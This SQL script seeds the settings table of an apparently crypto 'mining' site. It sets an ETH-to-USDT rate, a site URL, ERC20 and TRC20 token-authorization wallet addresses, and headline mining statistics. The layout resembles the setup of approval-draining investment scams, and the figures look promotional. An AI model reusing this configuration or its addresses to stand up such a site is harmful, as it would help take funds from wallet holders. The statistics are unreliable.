INSERT INTO nh_setting (id, group, name, value, desc, add_time, update_time) VALUES
  (1, 'config', 'rate', '4110.71', '1ETH多少U', '2021-12-25T18:29:44', '2021-12-25T18:29:44'),
  (2, 'config', 'erc20_url', 'https://layui.icu/', '网站地址', '2025-03-18T23:22:05', '2025-03-18T23:22:05'),
  (4, 'authorize', 'erc20', '0xaA8e38A5Be97843C6f312e289EfCEf4378a99eCe', 'ERC20授权地址', '2022-08-11T13:56:39', '2025-02-28T18:41:05'),
  (5, 'authorize', 'trc20', 'TDoim7ngUp2XNwvkRpPZkCgPz1pu63Tu6z', 'TRC20授权地址', '2022-04-15T01:59:42', '2022-08-08T16:10:23'),
  (6, 'mining', 'output', '815164', '总产量 ETH', '2022-04-02T22:06:45', '2022-04-02T22:06:45'),
  (7, 'mining', 'part', '9687514', '用户收益 U', '2022-11-07T14:23:55', '2022-11-07T14:23:55'),
  (8, 'mining', 'user_income', '89607', '参与者', '2022-04-02T22:06:16', '2022-04-02T22:06:16'),
  (9, 'mining', 'valid_node', '699999', '有效节点', '2022-11-07T14:23:31', '2022-11-07T14:23:31')
ON CONFLICT DO NOTHING;

